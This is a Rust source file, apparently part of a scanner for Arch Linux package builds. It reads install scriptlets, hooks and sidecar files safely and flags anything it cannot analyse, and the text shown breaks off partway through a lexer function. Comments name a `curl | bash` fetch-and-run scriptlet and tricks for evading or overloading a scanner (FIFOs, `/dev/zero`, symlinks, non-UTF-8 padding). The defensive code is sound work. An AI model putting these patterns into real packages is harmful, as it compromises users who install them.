//! Reading the files that ship beside a PKGBUILD, without ever failing open.
//!
//! The PKGBUILD is only part of what makepkg runs: the `.install` scriptlet,
//! ALPM `.hook` files, local `source=()` entries and sidecar scripts all execute
//! (or are installed) too. Every one of those used to be read with
//! `read_to_string` behind a size check, and ANY read failure was logged and the
//! file treated as absent -- so a single non-UTF-8 byte, or padding past the
//! size cap, made a package with a `curl | bash` scriptlet scan clean.
//!
//! The rules here:
//!
//! * A file is decoded lossily. Bytes can no longer hide content.
//! * Reads are bounded by `take(cap)`, not by trusting `metadata().len()`.
//! * Symlinks and non-regular files (FIFO, device) are never followed or
//!   opened. A FIFO would hang the scan; `/dev/zero` would exhaust memory; a
//!   link to `/etc/hostname` would leak host files into reports.
//! * Anything declared or shipped that cannot be fully analyzed produces a
//!   Critical [`SCAN-001`](crate::types::UNANALYZABLE_CODE) finding. It is never
//!   silently dropped.

use crate::parser::{self, ParsedInstallScript, ParsedPkgbuild};
use crate::types::{
    Category, FileType, Finding, Location, Severity, OPAQUE_ARCHIVE_CODE, TAR_ESCAPE_CODE,
    TAR_ODD_CODE, UNANALYZABLE_CODE,
};
use std::cell::{Cell, RefCell};
use std::collections::{HashMap, HashSet};
use std::fs::File;
use std::io::Read;
use std::path::{Component, Path, PathBuf};
use tracing::debug;

/// Maximum size of a file the scanner will read into memory. Real PKGBUILDs
/// and install scripts are a few KB; anything past this is abnormal and a
/// memory-exhaustion risk from a hostile repository.
pub const MAX_SCAN_FILE_BYTES: u64 = 2 * 1024 * 1024;

/// Total bytes the scanner will hold for the files beside one PKGBUILD. Each
/// file is individually capped; this bounds a directory of many of them.
const MAX_TOTAL_BYTES: u64 = 64 * 1024 * 1024;

/// How many undeclared script-like files are loaded from one directory.
const MAX_TREE_FILES: usize = 4096;
/// Deepest directory level walked below the package directory.
const MAX_TREE_DEPTH: usize = 8;
/// Wall-clock budget for reading one package directory. Past it the scan
/// reports what it could not review (Critical) and stops, so a hostile tree
/// cannot hold a blocking thread for long.
const COLLECT_BUDGET: std::time::Duration = std::time::Duration::from_secs(20);

/// Extensions of files that run or get installed as scripts/units.
const SCRIPT_EXTENSIONS: &[&str] = &[
    "sh", "bash", "zsh", "ksh", "dash", "py", "pl", "rb", "js", "lua", "php", "service", "timer",
    "socket", "path",
];

/// Names that are never treated as sidecars.
const IGNORED_NAMES: &[&str] = &["PKGBUILD", ".SRCINFO", ".gitignore", ".git", ".AURINFO"];

/// Entries in the package directory that are never read as package content.
/// Everything else -- dotfiles included -- is a candidate, because anything in
/// the directory is reachable from the build via `$startdir`.
const NEVER_SCANNED: &[&str] = &["PKGBUILD", ".SRCINFO"];

/// How much of a file is sampled to decide whether it is text.
const TEXT_SAMPLE_BYTES: usize = 8 * 1024;

/// A file read, possibly truncated at the cap.
#[derive(Debug)]
pub struct CappedRead {
    /// Lossily decoded text.
    pub content: String,
    /// The file was longer than the cap; `content` is only its prefix.
    pub truncated: bool,
    /// Size on disk at open time.
    pub size: u64,
}

fn err(msg: impl Into<String>) -> std::io::Error {
    std::io::Error::other(msg.into())
}

/// Open `path` only if it is a plain regular file: not a symlink, not a FIFO,
/// socket or device. Checked with `symlink_metadata` first (never opens a FIFO)
/// and re-checked on the open handle.
fn open_regular(path: &Path) -> std::io::Result<File> {
    let meta = std::fs::symlink_metadata(path)?;
    let ft = meta.file_type();
    if ft.is_symlink() {
        return Err(err(describe_symlink(path)));
    }
    if !ft.is_file() {
        return Err(err(
            "not a regular file (FIFO, socket, device or directory)",
        ));
    }
    let f = File::open(path)?;
    let opened = f.metadata()?;
    if !opened.is_file() {
        return Err(err("not a regular file"));
    }
    #[cfg(unix)]
    {
        use std::os::unix::fs::MetadataExt;
        if (opened.dev(), opened.ino()) != (meta.dev(), meta.ino()) {
            return Err(err("file changed while it was being opened"));
        }
    }
    Ok(f)
}

/// "symlink to <target>" -- the target path only, never its contents.
fn describe_symlink(path: &Path) -> String {
    match std::fs::read_link(path) {
        Ok(t) => format!(
            "is a symlink to '{}'; links are never followed, and a link pointing outside the package directory is itself suspicious",
            t.display()
        ),
        Err(_) => "is a symlink; links are never followed".to_string(),
    }
}

/// Read up to [`MAX_SCAN_FILE_BYTES`] of a regular file, decoding lossily.
pub fn read_capped_lossy(path: &Path) -> std::io::Result<CappedRead> {
    let f = open_regular(path)?;
    let size = f.metadata()?.len();
    let mut buf = Vec::new();
    // One byte past the cap tells us the file is longer than it, regardless of
    // what the metadata claimed.
    f.take(MAX_SCAN_FILE_BYTES + 1).read_to_end(&mut buf)?;
    let truncated = buf.len() as u64 > MAX_SCAN_FILE_BYTES;
    if truncated {
        buf.truncate(MAX_SCAN_FILE_BYTES as usize);
    }
    Ok(CappedRead {
        content: String::from_utf8_lossy(&buf).into_owned(),
        truncated,
        size,
    })
}

/// Read a text file for analysis, refusing files larger than the cap.
///
/// Public so every caller that touches package-controlled files -- including the
/// CLI's history and diff paths -- shares one reader. Invalid UTF-8 is decoded
/// lossily rather than failing; symlinks and non-regular files are refused.
pub fn read_text_capped(path: &Path) -> crate::Result<String> {
    let r = read_capped_lossy(path)?;
    if r.truncated {
        tracing::warn!(
            "refusing to read {} ({} bytes > {} cap): possible resource-exhaustion attempt",
            path.display(),
            r.size,
            MAX_SCAN_FILE_BYTES
        );
        return Err(crate::ScanError::Io(err(format!(
            "file too large to scan safely: {} bytes",
            r.size
        ))));
    }
    Ok(r.content)
}

/// Build the Critical "could not be analyzed" finding for `path`.
pub fn unanalyzable_finding(path: &Path, reason: &str) -> Finding {
    let name = path
        .file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .unwrap_or_else(|| path.display().to_string());
    Finding {
        id: UNANALYZABLE_CODE.to_string(),
        severity: Severity::Critical,
        category: Category::Configuration,
        title: format!("Package file could not be analyzed: {name}"),
        description: format!(
            "'{}' {reason}. Content that was not analyzed cannot be reported clean; a payload \
             can hide behind exactly this.",
            path.display()
        ),
        location: Location {
            file: path.to_path_buf(),
            line: None,
            column: None,
            snippet: None,
        },
        recommendation: "Do not install. Inspect the file by hand; a legitimate package has no \
                         reason to ship an oversized, unreadable, or symlinked script."
            .to_string(),
        cwe_id: Some("CWE-693".to_string()),
        metadata: serde_json::json!({ "path": path.display().to_string(), "reason": reason }),
    }
}

/// High `META-007` for an `install=` that cannot be resolved statically.
fn unresolved_install_finding(dir: &Path, values: &[String]) -> Finding {
    let shown = values.join("; ");
    Finding {
        id: "META-007".to_string(),
        severity: Severity::High,
        category: Category::SuspiciousMetadata,
        title: "install= cannot be statically resolved".to_string(),
        description: format!(
            "The install scriptlet name is not a plain value the scanner can resolve ({shown}). \
             makepkg runs whichever file it names as the package's install scriptlet, so every \
             file beside the PKGBUILD was scanned as a possible scriptlet."
        ),
        location: Location {
            file: dir.join("PKGBUILD"),
            line: None,
            column: None,
            snippet: Some(format!("install={shown}")),
        },
        recommendation: "Do not install. Use a literal `install=<pkgname>.install` and review \
                         the file it names."
            .to_string(),
        cwe_id: Some("CWE-426".to_string()),
        metadata: serde_json::json!({ "values": values }),
    }
}

/// Contents of every file the scanner types as an install scriptlet or hook,
/// ordered by file name. This is what the history layer hashes, so an
/// attacker-chosen scriptlet filename cannot hide a change from it.
pub fn install_script_contents(dir: &Path, pkg: &ParsedPkgbuild) -> Vec<String> {
    let pf = collect(dir, pkg);
    let mut v: Vec<(String, String)> = pf
        .install
        .into_iter()
        .chain(pf.side)
        .filter(|s| s.file_type == FileType::InstallScript)
        .map(|s| {
            let name = s
                .path
                .file_name()
                .map(|n| n.to_string_lossy().into_owned())
                .unwrap_or_default();
            (name, s.content)
        })
        .collect();
    v.sort();
    v.into_iter().map(|(_, c)| c).collect()
}

/// Everything found beside the PKGBUILD.
#[derive(Debug, Default)]
pub struct PackageFiles {
    /// The primary install scriptlet (first declared, else first `*.install`).
    pub install: Option<ParsedInstallScript>,
    /// Every other scriptlet, hook, local source and sidecar script.
    pub side: Vec<ParsedInstallScript>,
    /// `SCAN-001` findings for anything that could not be fully analyzed.
    pub findings: Vec<Finding>,
}

/// Result of expanding PKGBUILD variables in a string.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Expanded {
    /// The expanded text. Any variable that could not be resolved is replaced by
    /// [`WILDCARD`].
    pub text: String,
    /// Every variable resolved.
    pub complete: bool,
}

/// Stands in for an unresolvable `$var` so the name can be glob-matched.
pub const WILDCARD: char = '\u{1}';

/// Per-expansion context: inside `package_<name>()` makepkg sets `pkgname` to
/// that split package's name, not the first one.
#[derive(Clone, Copy, Default)]
struct Ctx<'a> {
    pkgname: Option<&'a str>,
    /// When set, a variable resolves only if it is assigned exactly once, at
    /// top level, in plain form (see [`Census::stable`]).
    census: Option<&'a Census>,
    work: Option<&'a Work>,
}

/// Step budget and memo shared by one top-level expansion. Expansion work grows
/// with the nesting of the values it expands; this bounds it.
/// Variable name and the `pkgname` override it was expanded under.
type MemoKey = (String, Option<String>);

struct Work {
    steps: Cell<usize>,
    memo: RefCell<HashMap<MemoKey, Option<String>>>,
}

/// Most steps one expansion may take before it gives up as unresolved.
const MAX_EXPAND_STEPS: usize = 20_000;
/// Longest value or pattern the `%`/`#` operators will glob over.
const MAX_GLOB_LEN: usize = 512;

impl Work {
    fn new() -> Self {
        Work {
            steps: Cell::new(0),
            memo: RefCell::new(HashMap::new()),
        }
    }
}

fn spend(ctx: &Ctx, n: usize) -> bool {
    match ctx.work {
        Some(w) => {
            let used = w.steps.get().saturating_add(n);
            w.steps.set(used);
            used <= MAX_EXPAND_STEPS
        }
        None => true,
    }
}

/// How the PKGBUILD text writes each variable, found without executing it.
#[derive(Default)]
struct Census {
    /// Plain `name=` / `name=(...)` writes seen anywhere.
    writes: HashMap<String, u32>,
    /// Names written anywhere other than top level.
    nontop: HashSet<String>,
    /// Names modified some other way: `+=`, `name[i]=`, `read`, `printf -v`,
    /// `${name:=}`, `for name in`, `unset`, `let`, `declare -n`.
    exotic: HashSet<String>,
    /// Like `exotic`, but only for writes at top level or in `package*()`, the
    /// code whose effect on `install=` makepkg observes.
    exotic_pkg: HashSet<String>,
    /// `eval "...$x..."`, `source file` or `. file` at top level or in
    /// `package*()`: code the scanner cannot see.
    dynamic: bool,
}

impl Census {
    /// A variable whose value can be trusted: written exactly once, at top
    /// level, as a plain assignment, with nothing opaque in the file.
    fn stable(&self, name: &str) -> bool {
        !self.dynamic
            && !self.exotic.contains(name)
            && !self.nontop.contains(name)
            && self.writes.get(name).copied() == Some(1)
    }

    /// A name nothing in the file writes at all.
    fn unset(&self, name: &str) -> bool {
        !self.dynamic && !self.exotic.contains(name) && !self.writes.contains_key(name)
    }
}

/// Longest string an expansion may produce; bounds pathological `${x:-...}` nests.
const MAX_EXPANDED_LEN: usize = 4096;

fn lookup_var(pkg: &ParsedPkgbuild, ctx: &Ctx, name: &str) -> Option<String> {
    let v = match name {
        "pkgname" => ctx
            .pkgname
            .map(str::to_string)
            .or_else(|| pkg.pkgname.first().cloned()),
        "pkgbase" => pkg
            .variables
            .get("pkgbase")
            .cloned()
            .or_else(|| pkg.pkgname.first().cloned()),
        "pkgver" => Some(pkg.pkgver.clone()).filter(|s| !s.is_empty()),
        "pkgrel" => Some(pkg.pkgrel.clone()).filter(|s| !s.is_empty()),
        "epoch" => pkg.epoch.clone(),
        "url" => pkg.url.clone(),
        other => pkg
            .variables
            .get(other)
            .filter(|s| !s.starts_with('['))
            .cloned(),
    }?;
    Some(v.trim_matches(['"', '\'']).to_string())
}

/// `${name[N]}` for the arrays the parser keeps.
fn lookup_index(pkg: &ParsedPkgbuild, ctx: &Ctx, name: &str, idx: &str) -> Option<String> {
    if ctx.census.is_some_and(|c| !c.stable(name)) {
        return None;
    }
    let n: usize = idx.trim().parse().ok()?;
    if name == "pkgname" {
        return pkg.pkgname.get(n).cloned();
    }
    let raw = pkg.variables.get(name)?;
    let arr: Vec<String> = serde_json::from_str(raw).ok()?;
    arr.get(n).cloned()
}

/// The fully expanded value of a variable, or `None` when it cannot be trusted
/// (written more than once, written in a function, self-referential, too deep).
fn resolve_var(pkg: &ParsedPkgbuild, ctx: &Ctx, name: &str, depth: u8) -> Option<String> {
    if let Some(cs) = ctx.census {
        let ok = if name == "pkgbase" {
            cs.stable("pkgbase") || (!cs.writes.contains_key("pkgbase") && cs.stable("pkgname"))
        } else {
            cs.stable(name)
        };
        if !ok {
            return None;
        }
    }
    let raw = lookup_var(pkg, ctx, name)?;
    if !raw.contains(['$', '`']) {
        return Some(raw);
    }
    if depth == 0 || !spend(ctx, 1) {
        return None;
    }
    let key = (name.to_string(), ctx.pkgname.map(str::to_string));
    if let Some(w) = ctx.work {
        if let Some(v) = w.memo.borrow().get(&key) {
            return v.clone();
        }
        // In progress: a self-reference is unresolved, not an infinite descent.
        w.memo.borrow_mut().insert(key.clone(), None);
    }
    let e = expand_depth(&raw, pkg, ctx, depth - 1);
    let r = e.complete.then_some(e.text);
    if let Some(w) = ctx.work {
        w.memo.borrow_mut().insert(key, r.clone());
    }
    r
}

/// Is `name` assigned anywhere in the PKGBUILD text, including inside
/// functions and `eval` strings? A default (`${x:-demo}`) is only trusted when
/// nothing could have set `x` first.
fn assigned_anywhere(pkg: &ParsedPkgbuild, name: &str) -> bool {
    let text = &pkg.raw_content;
    for pat in [format!("{name}="), format!("{name}+=")] {
        for (i, _) in text.match_indices(&pat) {
            let boundary = text[..i]
                .chars()
                .next_back()
                .is_none_or(|c| !(c.is_ascii_alphanumeric() || c == '_'));
            if boundary {
                return true;
            }
        }
    }
    // `read x`, `printf -v x`, `for x in`: a bare-word assignment.
    text.contains(&format!("read {name}"))
        || text.contains(&format!("-v {name}"))
        || text.contains(&format!("for {name} "))
}

/// Expand `$name` / `${name}` using the PKGBUILD's own top-level variables.
/// Static only: nothing is executed. Supported parameter expansions are the
/// ones PKGBUILDs actually use to build a filename: `${x%suffix}`, `${x#prefix}`
/// (and `%%`, `##`), `${x,,}`, `${x^^}`, `${x:-default}`, `${x:+alt}`,
/// `${x/a/b}`, `${x:N:M}`, `${arr[N]}` and `$(echo literal)`. Anything else
/// counts as unresolved.
pub fn expand_vars(value: &str, pkg: &ParsedPkgbuild) -> Expanded {
    expand_with(value, pkg, &Ctx::default())
}

fn expand_with(value: &str, pkg: &ParsedPkgbuild, ctx: &Ctx) -> Expanded {
    let work = Work::new();
    let c = Ctx {
        work: Some(&work),
        ..*ctx
    };
    expand_depth(value.trim().trim_matches(['"', '\'']), pkg, &c, 8)
}

/// Index of the delimiter closing the group opened just before `from`, with
/// nesting of the same kind. `chars[from..]` is the text after the opener.
fn matching_close(chars: &[char], from: usize, open: char, close: char) -> Option<usize> {
    let mut depth = 1usize;
    for (k, &c) in chars.iter().enumerate().skip(from) {
        if c == open {
            depth += 1;
        } else if c == close {
            depth -= 1;
            if depth == 0 {
                return Some(k);
            }
        }
    }
    None
}

/// Iterative glob match, O(n*m): `is_star` characters match any run and
/// `is_any` characters any single one. No backtracking blow-up.
fn glob_iter(
    pat: &[char],
    s: &[char],
    is_star: impl Fn(char) -> bool,
    is_any: impl Fn(char) -> bool,
) -> bool {
    let (mut p, mut i) = (0usize, 0usize);
    let mut star: Option<(usize, usize)> = None;
    while i < s.len() {
        if p < pat.len() && is_star(pat[p]) {
            star = Some((p, i));
            p += 1;
        } else if p < pat.len() && (is_any(pat[p]) || pat[p] == s[i]) {
            p += 1;
            i += 1;
        } else if let Some((sp, si)) = star {
            p = sp + 1;
            i = si + 1;
            star = Some((sp, si + 1));
        } else {
            return false;
        }
    }
    while p < pat.len() && is_star(pat[p]) {
        p += 1;
    }
    p == pat.len()
}

/// Shell glob (`*`, `?`, literals) over whole strings; `[...]` is unsupported.
fn glob_match(pat: &[char], s: &[char]) -> bool {
    glob_iter(pat, s, |c| c == '*', |c| c == '?')
}

/// `$(echo literal)` / `` `echo literal` `` with a plain literal argument.
fn eval_cmdsubst(inner: &str, pkg: &ParsedPkgbuild, ctx: &Ctx, depth: u8) -> Option<String> {
    let t = inner.trim();
    let rest = t.strip_prefix("echo")?;
    if !rest.starts_with(char::is_whitespace) {
        return None;
    }
    let mut arg = rest.trim();
    if let Some(a) = arg.strip_prefix("-n ") {
        arg = a.trim();
    }
    if arg.is_empty() || arg.contains(['`', ';', '|', '&', '<', '>', '(', ')', '\n', '\\']) {
        return None;
    }
    let e = expand_depth(arg, pkg, ctx, depth.saturating_sub(1));
    e.complete.then_some(e.text)
}

/// Evaluate the inside of `${...}`.
fn eval_param(inner: &str, pkg: &ParsedPkgbuild, ctx: &Ctx, depth: u8) -> Option<String> {
    let chars: Vec<char> = inner.chars().collect();
    let mut n = 0;
    while n < chars.len() && (chars[n].is_ascii_alphanumeric() || chars[n] == '_') {
        n += 1;
    }
    if n == 0 {
        return None;
    }
    let name: String = chars[..n].iter().collect();
    let mut rest: String = chars[n..].iter().collect();
    let mut indexed = None;
    if let Some(r) = rest.strip_prefix('[') {
        let close = r.find(']')?;
        indexed = Some(r[..close].to_string());
        rest = r[close + 1..].to_string();
    }
    // A variable's value may itself hold expansions (`_pkgname=${pkgname#py-}`),
    // so resolve it recursively; a value that stays unresolved is unset here.
    let base = match &indexed {
        Some(i) => lookup_index(pkg, ctx, &name, i).and_then(|v| {
            if v.contains(['$', '`']) {
                let e = expand_depth(&v, pkg, ctx, depth.saturating_sub(1));
                e.complete.then_some(e.text)
            } else {
                Some(v)
            }
        }),
        None => resolve_var(pkg, ctx, &name, depth),
    };
    // Nothing else in the file may set `name` for a default to be trusted.
    let assigned = |n: &str| match ctx.census {
        Some(c) => !c.unset(n),
        None => assigned_anywhere(pkg, n),
    };
    let sub = |w: &str| -> Option<String> {
        let e = expand_depth(w, pkg, ctx, depth.saturating_sub(1));
        e.complete.then_some(e.text)
    };
    let cs = |s: &str| -> Vec<char> { s.chars().collect() };

    if rest.is_empty() {
        return base;
    }
    // Defaults: only sound when nothing else in the file could set the name.
    if let Some(w) = rest.strip_prefix(":-").or_else(|| rest.strip_prefix(":=")) {
        return match base.filter(|b| !b.is_empty()) {
            Some(b) => Some(b),
            None if assigned(&name) => None,
            None => sub(w),
        };
    }
    if let Some(w) = rest.strip_prefix('-').or_else(|| rest.strip_prefix('=')) {
        return match base {
            Some(b) => Some(b),
            None if assigned(&name) => None,
            None => sub(w),
        };
    }
    if let Some(w) = rest.strip_prefix(":+") {
        return match base.filter(|b| !b.is_empty()) {
            Some(_) => sub(w),
            None if assigned(&name) => None,
            None => Some(String::new()),
        };
    }
    let b = base?;
    let bc = cs(&b);
    if bc.len() > MAX_GLOB_LEN {
        return None;
    }
    if let Some(p) = rest.strip_prefix("%%").or_else(|| rest.strip_prefix('%')) {
        let longest = rest.starts_with("%%");
        let pat = cs(&sub(p)?);
        if pat.contains(&'[') || pat.len() > MAX_GLOB_LEN {
            return None;
        }
        let starts: Vec<usize> = if longest {
            (0..=bc.len()).collect()
        } else {
            (0..=bc.len()).rev().collect()
        };
        for st in starts {
            if glob_match(&pat, &bc[st..]) {
                return Some(bc[..st].iter().collect());
            }
        }
        return Some(b);
    }
    if let Some(p) = rest.strip_prefix("##").or_else(|| rest.strip_prefix('#')) {
        let longest = rest.starts_with("##");
        let pat = cs(&sub(p)?);
        if pat.contains(&'[') || pat.len() > MAX_GLOB_LEN {
            return None;
        }
        let ends: Vec<usize> = if longest {
            (0..=bc.len()).rev().collect()
        } else {
            (0..=bc.len()).collect()
        };
        for en in ends {
            if glob_match(&pat, &bc[..en]) {
                return Some(bc[en..].iter().collect());
            }
        }
        return Some(b);
    }
    match rest.as_str() {
        ",," => return Some(b.to_lowercase()),
        "^^" => return Some(b.to_uppercase()),
        "," | "^" => {
            let mut it = b.chars();
            let first = it.next()?;
            let f: String = if rest == "," {
                first.to_lowercase().collect()
            } else {
                first.to_uppercase().collect()
            };
            return Some(f + it.as_str());
        }
        _ => {}
    }
    if let Some(r) = rest.strip_prefix("//").or_else(|| rest.strip_prefix('/')) {
        let all = rest.starts_with("//");
        let (pat, rep) = match r.split_once('/') {
            Some((p, q)) => (sub(p)?, sub(q)?),
            None => (sub(r)?, String::new()),
        };
        if pat.is_empty() || pat.contains(['*', '?', '[', '#', '%']) {
            return None;
        }
        return Some(if all {
            b.replace(&pat, &rep)
        } else {
            b.replacen(&pat, &rep, 1)
        });
    }
    if let Some(r) = rest.strip_prefix(':') {
        let (off, len) = match r.split_once(':') {
            Some((o, l)) => (o, Some(l)),
            None => (r, None),
        };
        let off: usize = off.trim().parse().ok()?;
        let tail = bc.get(off..)?;
        return Some(match len {
            Some(l) => {
                let l: usize = l.trim().parse().ok()?;
                tail.iter().take(l).collect()
            }
            None => tail.iter().collect(),
        });
    }
    None
}

fn expand_depth(s: &str, pkg: &ParsedPkgbuild, ctx: &Ctx, depth: u8) -> Expanded {
    let chars: Vec<char> = s.chars().collect();
    let mut out = String::new();
    let mut complete = true;
    let mut i = 0;
    while i < chars.len() {
        if out.len() > MAX_EXPANDED_LEN || !spend(ctx, 1) {
            return Expanded {
                text: out,
                complete: false,
            };
        }
        let c = chars[i];
        // Quotes only delimit; they are not part of the resulting name.
        if c == '"' || c == '\'' {
            i += 1;
            continue;
        }
        if c == '`' {
            let end = chars[i + 1..].iter().position(|&x| x == '`');
            let (res, next) = match end {
                Some(rel) => {
                    let inner: String = chars[i + 1..i + 1 + rel].iter().collect();
                    (
                        (depth > 0)
                            .then(|| eval_cmdsubst(&inner, pkg, ctx, depth))
                            .flatten(),
                        i + rel + 2,
                    )
                }
                None => (None, chars.len()),
            };
            match res {
                Some(t) => out.push_str(&t),
                None => {
                    out.push(WILDCARD);
                    complete = false;
                }
            }
            i = next;
            continue;
        }
        if c != '$' {
            out.push(c);
            i += 1;
            continue;
        }
        let (res, next): (Option<String>, usize) = match chars.get(i + 1) {
            Some('{') => match matching_close(&chars, i + 2, '{', '}') {
                Some(close) => {
                    let inner: String = chars[i + 2..close].iter().collect();
                    (
                        (depth > 0)
                            .then(|| eval_param(&inner, pkg, ctx, depth))
                            .flatten(),
                        close + 1,
                    )
                }
                None => (None, chars.len()),
            },
            Some('(') => match matching_close(&chars, i + 2, '(', ')') {
                Some(close) => {
                    let inner: String = chars[i + 2..close].iter().collect();
                    (
                        (depth > 0)
                            .then(|| eval_cmdsubst(&inner, pkg, ctx, depth))
                            .flatten(),
                        close + 1,
                    )
                }
                None => (None, chars.len()),
            },
            _ => {
                let mut j = i + 1;
                while j < chars.len() && (chars[j].is_ascii_alphanumeric() || chars[j] == '_') {
                    j += 1;
                }
                let n: String = chars[i + 1..j].iter().collect();
                let r = if n.is_empty() || depth == 0 {
                    None
                } else {
                    resolve_var(pkg, ctx, &n, depth)
                };
                (r, j.max(i + 1))
            }
        };
        match res {
            Some(t) => out.push_str(&t),
            None => {
                out.push(WILDCARD);
                complete = false;
            }
        }
        i = next.max(i + 1);
    }
    Expanded {
        text: out,
        complete,
    }
}

/// Glob match where [`WILDCARD`] matches any run of characters.
fn wildcard_match(pat: &[char], name: &[char]) -> bool {
    glob_iter(pat, name, |c| c == WILDCARD, |_| false)
}

/// The filename makepkg uses for a local `source=()` entry: a `name::` rename if
/// present, otherwise the basename of the path (directories are dropped, so
/// `scripts/helper.sh` is `helper.sh` in the package directory).
fn local_source_name(entry: &parser::SourceEntry, pkg: &ParsedPkgbuild) -> Option<Expanded> {
    if let Some(f) = &entry.filename {
        return Some(expand_vars(f, pkg));
    }
    let url = expand_vars(&entry.url, pkg);
    // Variables may expand to a remote URL (`$_baseurl/x.tar.gz`).
    if url.complete && parser::Protocol::from_url(&url.text).is_remote() {
        return None;
    }
    let no_frag = url.text.split(['#', '?']).next().unwrap_or_default();
    let base = no_frag.rsplit('/').next().unwrap_or_default();
    Some(Expanded {
        text: base.to_string(),
        complete: url.complete,
    })
}

/// A plain single filename: no separators, not `.`/`..`, no NUL.
fn is_plain_name(name: &str) -> bool {
    !name.is_empty() && name != "." && name != ".." && !name.contains(['/', '\\', '\0'])
}

fn is_script_name(name: &str) -> bool {
    Path::new(name)
        .extension()
        .and_then(|e| e.to_str())
        .is_some_and(|e| SCRIPT_EXTENSIONS.contains(&e.to_ascii_lowercase().as_str()))
}

/// Join a declared relative path onto `dir`, refusing anything that could
/// leave it: absolute paths, `..`, and any symlinked intermediate directory.
fn safe_join(dir: &Path, rel: &str) -> Result<PathBuf, String> {
    let rel_path = Path::new(rel);
    let mut cur = dir.to_path_buf();
    let comps: Vec<Component> = rel_path.components().collect();
    if comps.is_empty() {
        return Err("is empty".into());
    }
    for (idx, c) in comps.iter().enumerate() {
        match c {
            Component::Normal(n) => {
                cur.push(n);
                if idx + 1 < comps.len() {
                    match std::fs::symlink_metadata(&cur) {
                        Ok(m) if m.is_dir() => {}
                        Ok(_) => return Err("passes through a non-directory or symlink".into()),
                        Err(_) => return Err("is missing".into()),
                    }
                }
            }
            Component::CurDir => {}
            _ => return Err("escapes the package directory (absolute or '..')".into()),
        }
    }
    Ok(cur)
}

/// One `install=` assignment found anywhere in the PKGBUILD text.
#[derive(Debug, Clone, PartialEq, Eq)]
struct InstallDecl {
    /// The raw word after `install=`.
    value: String,
    /// `pkgname` as makepkg sets it when the assignment sits in
    /// `package_<name>()`; `None` elsewhere.
    pkgname: Option<String>,
    /// Tried under a `pkgname` the lexer did not attribute (every package name,
    /// pkgbase, every `package_*` suffix): a file that exists is typed as a
    /// scriptlet, a missing or unresolvable one says nothing.
    speculative: bool,
}

/// Read one shell word starting at `s`: quotes and `${..}` / `$(..)` nest, an
/// unquoted separator ends it. `enclosing` is the quote the assignment itself
/// sits inside (an `eval "install=..."` string), which also ends the word.
fn read_word(s: &str, enclosing: Option<char>) -> String {
    const MAX_WORD: usize = 1024;
    let mut out = String::new();
    let mut quote: Option<char> = None;
    let mut depth = 0usize;
    let mut prev = ' ';
    for ch in s.chars() {
        if out.len() > MAX_WORD {
            // Not a file name: unresolved, never a partial value.
            return "${__too_long__}".to_string();
        }
        if let Some(q) = quote {
            out.push(ch);
            if ch == q {
                quote = None;
            }
            prev = ch;
            continue;
        }
        if depth == 0 && Some(ch) == enclosing {
            break;
        }
        match ch {
            '"' | '\'' | '`' => {
                quote = Some(ch);
                out.push(ch);
            }
            '{' | '(' if prev == '$' => {
                depth += 1;
                out.push(ch);
            }
            '}' | ')' if depth > 0 => {
                depth -= 1;
                out.push(ch);
            }
            c if depth == 0 && (c.is_whitespace() || ";&|)}<>".contains(c)) => break,
            c => out.push(c),
        }
        prev = ch;
    }
    out
}

/// `NAME=value` / `NAME+=value` / `NAME[i]=value` as one shell word.
fn is_assignment_word(tok: &str) -> bool {
    let t = tok.trim_start_matches(['"', '\'']);
    let ident = t
        .chars()
        .take_while(|c| c.is_ascii_alphanumeric() || *c == '_')
        .count();
    if ident == 0 || t.starts_with(|c: char| c.is_ascii_digit()) {
        return false;
    }
    let rest = &t[ident..];
    let rest = rest.strip_prefix('+').unwrap_or(rest);
    rest.starts_with('=') || (rest.starts_with('[') && rest.contains("]="))
}

/// The last `n` bytes of `s`, cut on a character boundary. Every question about
/// an assignment's position only needs the words just before it, and bounding
/// the look-back keeps scanning a very long line linear.
fn tail_window(s: &str, n: usize) -> &str {
    if s.len() <= n {
        return s;
    }
    let mut lo = s.len() - n;
    while !s.is_char_boundary(lo) {
        lo += 1;
    }
    &s[lo..]
}

/// Statement boundaries and keywords after which a word is a command position.
const STATEMENT_ENDS: &[&str] = &[
    ";", "&&", "||", "|", "&", "{", "(", ")", "then", "do", "else", "]]", "]", "!", "eval",
];

/// `p` (already trimmed) ends where a statement starts or at a declaration
/// keyword: the cases that make a following `name=` an assignment.
fn assignment_position_base(p: &str) -> bool {
    if p.is_empty() || STATEMENT_ENDS.iter().any(|e| p.ends_with(e)) {
        return true;
    }
    // `eval "install=..."`
    if (p.ends_with('"') || p.ends_with('\'')) && p[..p.len() - 1].trim_end().ends_with("eval") {
        return true;
    }
    // `declare -r install=...`, `local install=...`
    let mut it = p
        .split_whitespace()
        .rev()
        .skip_while(|t| t.starts_with('-'));
    matches!(
        it.next(),
        Some("declare" | "typeset" | "local" | "readonly" | "export")
    )
}

/// Whether text before an assignment puts it in assignment position. Only a
/// bounded window before the assignment is read, and a run of earlier
/// assignments (`a=1 b=2 install=...`) is skipped word by word, so a very long
/// line costs time linear in its length.
fn assignment_position(prefix: &str) -> bool {
    let mut p = tail_window(prefix, 192).trim_end();
    let mut skipped_assignment = false;
    loop {
        let st = p.rfind(char::is_whitespace).map_or(0, |i| i + 1);
        let tok = &p[st..];
        if !tok.is_empty() && is_assignment_word(tok) {
            skipped_assignment = true;
            p = p[..st].trim_end();
            if p.is_empty() {
                return true;
            }
            continue;
        }
        break;
    }
    if skipped_assignment && p.len() >= 150 {
        // The window ended inside a run of assignments: treat it as one.
        return true;
    }
    assignment_position_base(p)
}

/// One source line with the function it sits in (if any).
struct SrcLine<'a> {
    text: &'a str,
    func: Option<String>,
    comment: bool,
}

/// Split the PKGBUILD into lines and attribute each to the function body that
/// contains it. Braces are counted outside quotes, comments and heredoc bodies
/// only, so `echo "}"` does not end a function early.
fn lex_lines(raw: &str) -> Vec<SrcLine<'_>> {
    lazy_static::lazy_static! {
        static ref FUNC_HDR: regex::Regex = regex::Regex::new(
            r#"^(?:function\s+)?([A-Za-z_][A-Za-z0-9_.+@-]*)\s*(?:\(\s*\)|\{)"#
        ).unwrap();
        static ref HEREDOC_OP: regex::Regex = regex::Regex::new(r#"(?:^|[^<])<<-?"#).unwrap();
        static ref HEREDOC_TAG: regex::Regex =
            regex::Regex::new(r#"^\s*\\?(["']?)([A-Za-z0-9_]+)"#).unwrap();
    }
    let mut out = Vec::new();
    let mut cur: Option<String> = None;
    let mut depth: i64 = 0;
    let mut started = false;
    let (mut sq, mut dq) = (false, false);
    let mut heredoc: Option<String> = None;
